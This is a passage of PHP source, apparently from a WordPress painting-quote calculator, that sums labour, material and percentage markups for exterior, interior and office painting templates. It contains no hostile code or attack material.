                                }
                                elseif($trim_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $trim_total = $trim_total + ($range_price_total * $outer_length);
                                }

                        }
                }


                $extras = $data['extras'];
                $extras_total = 0;
                foreach($extras_data as $temp) {
                        if( in_array($temp['title'],$extras) ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($extras_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$extras_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $extras_total = $extras_total + ( $labour_and_material_total * $extra_count );
                                }
                                elseif($extras_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $extras_total = $extras_total + ( $range_price_total * $extra_count );
                                }

                        }
                }

                $paint = $data['paint'];
                $paint_details_total = 0;
                foreach($paint_data as $temp) {
                        if( $temp['title'] == $paint ) {

                                if($paint_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$paint_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $paint_details_total = $labour_and_material_total;
                                }
                                elseif($paint_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $paint_details_total = $range_price_total;
                                }

                        }
                }

					
					      $level = $data['level'];
                $level_total = 0;
                foreach($level_data as $temp) {
                        if( $temp['title'] == $level ) {

                                $range_price_total = $temp['range_price'];
                                $level_total = $range_price_total;

                        }
                }
					
                $exterior_total = $current_total + $windows_and_doors_total + $trim_total + $seal_total;
                $level_markup = $exterior_total * $level_total / 100;
                $bring_paint = $exterior_total * $paint_details_total / 100;
                $painting_exterior_total = $exterior_total + $bring_paint + $extras_total + $level_markup;

                $total = $total + $painting_exterior_total;

        }

        // V2
        if(get_the_title($t) == 'Interior') {

                $all_scope_data = get_field('quote_fields',$t);

                $width = $data['area_width'];
                $length = $data['area_length'];

                foreach($all_scope_data as $d) {
                        if($d['slug'] == 'ceiling_height') {
                                $height_data = $d['fields'];
                        }
                        if($d['slug'] == 'rooms') {
                                $p_rooms_title = $d['title'];
                                $p_rooms_prices = $d['type_of_price'];
                                $p_rooms_data = $d['fields'];
                        }
                        if($d['slug'] == 'paint') {
                                $paint_supply_title = $d['title'];
                                $paint_supply_prices = $d['type_of_price'];
                                $paint_supply_data = $d['fields'];
                        }
                        if($d['slug'] == 'doors') {
                                $extras_title = $d['title'];
                                $extras_prices = $d['type_of_price'];
                                $extras_data = $d['fields'];
                        }
                        if($d['slug'] == 'extras') {
                                $trim_title = $d['title'];
                                $trim_prices = $d['type_of_price'];
                                $trim_data = $d['fields'];
                        }
									      if($d['slug'] == 'surface') {
                                $surface_title = $d['title'];
                                $surface_prices = $d['type_of_price'];
                                $surface_data = $d['fields'];
                        }
									      if($d['slug'] == 'sealer') {
                                $sealer_title = $d['title'];
                                $sealer_prices = $d['type_of_price'];
                                $sealer_data = $d['fields'];
                        }
                        if($d['slug'] == 'other') {
                                $other_title = $d['title'];
                                $other_prices = $d['type_of_price'];
                                $other_data = $d['fields'];
                        }

                }
					 
                $height = $data['ceiling_height'];
                $height_total = 0;
                foreach($height_data as $temp) {
                        if( $temp['title'] == $height ) {

                                $range_price_total = $temp['range_price'];
                                $height_total = $range_price_total;

                        }
                }
					
				      	$sealer = $data['sealer'];
                $sealer_total = 0;
                foreach($sealer_data as $temp) {
                        if( $temp['title'] == $sealer ) {

                                $range_price_total = $temp['range_price'];
                                $sealer_total = $range_price_total;

                        }
                }

                $p_rooms = $data['rooms'];
                $p_rooms_total = 0;
                foreach($p_rooms_data as $temp) {
                        if( in_array($temp['title'],$p_rooms) ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($p_rooms_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$p_rooms_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $p_rooms_total = $p_rooms_total + ($labour_and_material_total * $extra_count);
                                }
                                elseif($p_rooms_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $p_rooms_total = $p_rooms_total + ($range_price_total * $extra_count);
                                }

                        }
                }

                $paint_supply = $data['paint'];
                $paint_supply_total = 0;
                foreach($paint_supply_data as $temp) {
                        if( $temp['title'] == $paint_supply ) {

                                $range_price_total = $temp['range_price'];
                                $paint_supply_total = $range_price_total;

                        }
                }

					    
                $extras = $data['doors'];
                $extras_total = 0;
                foreach($extras_data as $temp) {
                        if( in_array($temp['title'],$extras) ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($extras_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$extras_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $extras_total = $extras_total + ($labour_and_material_total * $extra_count);
                                }
                                elseif($extras_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $extras_total = $extras_total + ($range_price_total * $extra_count);
                                }

                        }
                }

               $other = $data['other'];
                $other_total = 0;
                foreach($other_data as $temp) {
                        if( in_array($temp['title'],$other) ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($other_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$other_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $other_total = $other_total + ($labour_and_material_total * $extra_count);
                                }
                                elseif($other_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $other_total = $other_total + ($range_price_total * $extra_count);
                                }

                        }
                }
					
                $surface = $data['surface'];
                $surface_total = 0;
                foreach($surface_data as $temp) {
                        if( in_array($temp['title'],$surface) ) {

                                if($surface_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$surface_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $surface_total = $surface_total + $labour_and_material_total;
                                }
                                elseif($surface_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $surface_total = $surface_total + $range_price_total;
                                }

                        }
                }

                $percent_total = $surface_total / 100;
					      $rooms_total = $p_rooms_total * $percent_total;
                $rooms_price_total = $rooms_total + ($rooms_total * $height_total / 100) + $other_total + $extras_total;
					      $sealer_total_price = $room_price_total * $sealer_total / 100;
                $paint_interior_total = $rooms_price_total + ($rooms_price_total * $paint_supply_total / 100) + $sealer_total;
					
                $total = $total + $paint_interior_total;
            
        }

	 // V2 formulas for Painting Exterior template
        if(get_the_title($t) == 'Exterior Painting') {

                $all_scope_data = get_field('quote_fields',$t);

                $width = $data['area_width'];
                $height = $data['area_height'];

                foreach($all_scope_data as $d) {
                        if($d['slug'] == 'current') {
                                $current_title = $d['title'];
                                $current_prices = $d['type_of_price'];
                                $current_data = $d['fields'];
                        }
							      		if($d['slug'] == 'level') {
                                                $level_title = $d['title'];
                                                $level_prices = $d['type_of_price'];
                                                $level_data = $d['fields'];
                                        }
                        if($d['slug'] == 'joinerys') {
                                $windows_and_doors_title = $d['title'];
                                $windows_and_doors_prices = $d['type_of_price'];
                                $windows_and_doors_data = $d['fields'];
                        }
                        if($d['slug'] == 'seal') {
                                $seal_title = $d['title'];
                                $seal_prices = $d['type_of_price'];
                                $seal_data = $d['fields'];
                        }
                        if($d['slug'] == 'trim') {
                                $trim_title = $d['title'];
                                $trim_prices = $d['type_of_price'];
                                $trim_data = $d['fields'];
                        }
                        if($d['slug'] == 'roof') {
                                $roof_title = $d['title'];
                                $roof_prices = $d['type_of_price'];
                                $roof_data = $d['fields'];
                        }
                        if($d['slug'] == 'extras') {
                                $extras_title = $d['title'];
                                $extras_prices = $d['type_of_price'];
                                $extras_data = $d['fields'];
                        }
                        if($d['slug'] == 'paint') {
                                $paint_title = $d['title'];
                                $paint_prices = $d['type_of_price'];
                                $paint_data = $d['fields'];
                        }

                }


                $wall_area = $width * $height;
                $outer_length = $width;

                $current = $data['current'];
                $current_total = 0;
                foreach($current_data as $temp) {
                        if( $temp['title'] == $current ) {

                                if($current_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$current_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $current_total = $current_total + ($labour_and_material_total * $wall_area);
                                }
                                elseif($current_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $current_total = $current_total + ($range_price_total * $wall_area);
                                }

                        }
                }


					      $seal = $data['seal'];
                $seal_total = 0;
                foreach($seal_data as $temp) {
                        if( $temp['title'] == $seal ) {

                                if($seal_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$seal_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $seal_total = $seal_total + ($labour_and_material_total * $wall_area);
                                }
                                elseif($seal_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $seal_total = $seal_total + ($range_price_total * $wall_area);
                                }

                        }
                }


                $windows_and_doors = $data['joinerys'];
                $windows_and_doors_total = 0;
                foreach($windows_and_doors_data as $temp) {
                        if( in_array($temp['title'],$windows_and_doors) ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($windows_and_doors_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$windows_and_doors_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $windows_and_doors_total = $windows_and_doors_total + ( $labour_and_material_total * $extra_count);
                                }
                                elseif($windows_and_doors_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $windows_and_doors_total = $windows_and_doors_total + ( $range_price_total * $extra_count);
                                }

                        }

                }

                $trim = $data['trim'];
                $trim_total = 0;
                foreach($trim_data as $temp) {
                        if( ($temp['title'] == $trim) || in_array($temp['title'],$trim) ) {

                                if($trim_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$trim_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $trim_total = $trim_total + ($labour_and_material_total * $outer_length);
                                }
                                elseif($trim_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $trim_total = $trim_total + ($range_price_total * $outer_length);
                                }

                        }
                }


                $extras = $data['extras'];
                $extras_total = 0;
                foreach($extras_data as $temp) {
                        if( in_array($temp['title'],$extras) ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($extras_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$extras_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $extras_total = $extras_total + ( $labour_and_material_total * $extra_count );
                                }
                                elseif($extras_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $extras_total = $extras_total + ( $range_price_total * $extra_count );
                                }

                        }
                }

                $paint = $data['paint'];
                $paint_details_total = 0;
                foreach($paint_data as $temp) {
                        if( $temp['title'] == $paint ) {

                                if($paint_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$paint_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $paint_details_total = $labour_and_material_total;
                                }
                                elseif($paint_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $paint_details_total = $range_price_total;
                                }

                        }
                }

					
					      $level = $data['level'];
                $level_total = 0;
                foreach($level_data as $temp) {
                        if( $temp['title'] == $level ) {

                                $range_price_total = $temp['range_price'];
                                $level_total = $range_price_total;

                        }
                }
					
                $exterior_total = $current_total + $windows_and_doors_total + $trim_total + $seal_total;
                $level_markup = $exterior_total * $level_total / 100;
                $bring_paint = $exterior_total * $paint_details_total / 100;
                $painting_exterior_total = $exterior_total + $bring_paint + $extras_total + $level_markup;

                $total = $total + $painting_exterior_total;

        }

        // V2
        if(get_the_title($t) == 'Interior Painting') {

                $all_scope_data = get_field('quote_fields',$t);

                $width = $data['area_width'];
                $length = $data['area_length'];

                foreach($all_scope_data as $d) {
                        if($d['slug'] == 'ceiling_height') {
                                $height_data = $d['fields'];
                        }
                        if($d['slug'] == 'rooms') {
                                $p_rooms_title = $d['title'];
                                $p_rooms_prices = $d['type_of_price'];
                                $p_rooms_data = $d['fields'];
                        }
                        if($d['slug'] == 'paint') {
                                $paint_supply_title = $d['title'];
                                $paint_supply_prices = $d['type_of_price'];
                                $paint_supply_data = $d['fields'];
                        }
                        if($d['slug'] == 'doors') {
                                $extras_title = $d['title'];
                                $extras_prices = $d['type_of_price'];
                                $extras_data = $d['fields'];
                        }
                        if($d['slug'] == 'extras') {
                                $trim_title = $d['title'];
                                $trim_prices = $d['type_of_price'];
                                $trim_data = $d['fields'];
                        }
									      if($d['slug'] == 'surface') {
                                $surface_title = $d['title'];
                                $surface_prices = $d['type_of_price'];
                                $surface_data = $d['fields'];
                        }
									      if($d['slug'] == 'sealer') {
                                $sealer_title = $d['title'];
                                $sealer_prices = $d['type_of_price'];
                                $sealer_data = $d['fields'];
                        }
                        if($d['slug'] == 'other') {
                                $other_title = $d['title'];
                                $other_prices = $d['type_of_price'];
                                $other_data = $d['fields'];
                        }

                }
					 
                $height = $data['ceiling_height'];
                $height_total = 0;
                foreach($height_data as $temp) {
                        if( $temp['title'] == $height ) {

                                $range_price_total = $temp['range_price'];
                                $height_total = $range_price_total;

                        }
                }
					
				      	$sealer = $data['sealer'];
                $sealer_total = 0;
                foreach($sealer_data as $temp) {
                        if( $temp['title'] == $sealer ) {

                                $range_price_total = $temp['range_price'];
                                $sealer_total = $range_price_total;

                        }
                }

                $p_rooms = $data['rooms'];
                $p_rooms_total = 0;
                foreach($p_rooms_data as $temp) {
                        if( in_array($temp['title'],$p_rooms) ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($p_rooms_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$p_rooms_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $p_rooms_total = $p_rooms_total + ($labour_and_material_total * $extra_count);
                                }
                                elseif($p_rooms_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $p_rooms_total = $p_rooms_total + ($range_price_total * $extra_count);
                                }

                        }
                }

                $paint_supply = $data['paint'];
                $paint_supply_total = 0;
                foreach($paint_supply_data as $temp) {
                        if( $temp['title'] == $paint_supply ) {

                                $range_price_total = $temp['range_price'];
                                $paint_supply_total = $range_price_total;

                        }
                }

					    
                $extras = $data['doors'];
                $extras_total = 0;
                foreach($extras_data as $temp) {
                        if( in_array($temp['title'],$extras) ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($extras_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$extras_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $extras_total = $extras_total + ($labour_and_material_total * $extra_count);
                                }
                                elseif($extras_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $extras_total = $extras_total + ($range_price_total * $extra_count);
                                }

                        }
                }

               $other = $data['other'];
                $other_total = 0;
                foreach($other_data as $temp) {
                        if( in_array($temp['title'],$other) ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($other_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$other_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $other_total = $other_total + ($labour_and_material_total * $extra_count);
                                }
                                elseif($other_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $other_total = $other_total + ($range_price_total * $extra_count);
                                }

                        }
                }
					
                $surface = $data['surface'];
                $surface_total = 0;
                foreach($surface_data as $temp) {
                        if( in_array($temp['title'],$surface) ) {

                                if($surface_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$surface_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $surface_total = $surface_total + $labour_and_material_total;
                                }
                                elseif($surface_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $surface_total = $surface_total + $range_price_total;
                                }

                        }
                }

                $percent_total = $surface_total / 100;
					      $rooms_total = $p_rooms_total * $percent_total;
                $rooms_price_total = $rooms_total + ($rooms_total * $height_total / 100) + $other_total + $extras_total;
					      $sealer_total_price = $room_price_total * $sealer_total / 100;
                $paint_interior_total = $rooms_price_total + ($rooms_price_total * $paint_supply_total / 100) + $sealer_total;
					
                $total = $total + $paint_interior_total;
            
        }

	
	 // V2
        if(get_the_title($t) == 'Full Office') {

                $all_scope_data = get_field('quote_fields',$t);

                $width = $data['area_width'];
                $length = $data['area_length'];

                foreach($all_scope_data as $d) {
                        if($d['slug'] == 'ceiling_height') {
                                $height_data = $d['fields'];
                        }
									      if($d['slug'] == 'level') {
                                 $level_title = $d['title'];
                                 $level_prices = $d['type_of_price'];
                                 $level_data = $d['fields'];
                        }
                        if($d['slug'] == 'rooms') {
                                $p_rooms_title = $d['title'];
                                $p_rooms_prices = $d['type_of_price'];
                                $p_rooms_data = $d['fields'];
                        }
                        if($d['slug'] == 'paint_ceilings') {
                                $paint_ceilings_title = $d['title'];
                                $paint_ceilings_prices = $d['type_of_price'];
                                $paint_ceilings_data = $d['fields'];
                        }
                        if($d['slug'] == 'paint') {
                                $paint_supply_title = $d['title'];
                                $paint_supply_prices = $d['type_of_price'];
                                $paint_supply_data = $d['fields'];
                        }
                        if($d['slug'] == 'doors') {
                                $extras_title = $d['title'];
                                $extras_prices = $d['type_of_price'];
                                $extras_data = $d['fields'];
                        }
                        if($d['slug'] == 'extras') {
                                $trim_title = $d['title'];
                                $trim_prices = $d['type_of_price'];
                                $trim_data = $d['fields'];
                        }
                        if($d['slug'] == 'other') {
                                $other_title = $d['title'];
                                $other_prices = $d['type_of_price'];
                                $other_data = $d['fields'];
                        }

                }

                $height = $data['ceiling_height'];
                $height_total = 0;
                foreach($height_data as $temp) {
                        if( $temp['title'] == $height ) {

                                $range_price_total = $temp['range_price'];
                                $height_total = $range_price_total;

                        }
                }

                $p_rooms = $data['rooms'];
                $p_rooms_total = 0;
                foreach($p_rooms_data as $temp) {
                        if( in_array($temp['title'],$p_rooms) ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($p_rooms_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
